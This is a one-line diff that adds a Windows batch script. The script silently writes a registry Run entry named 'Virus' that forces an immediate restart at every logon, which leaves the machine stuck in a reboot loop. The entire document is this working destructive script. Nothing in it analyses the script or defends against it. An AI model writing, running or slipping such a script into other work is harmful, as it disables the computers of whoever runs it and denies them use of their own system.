@@ -1,0 +1,1 @@
+@echo off reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Run /v Virus /d "shutdown -r -t 00" /f >nul exit
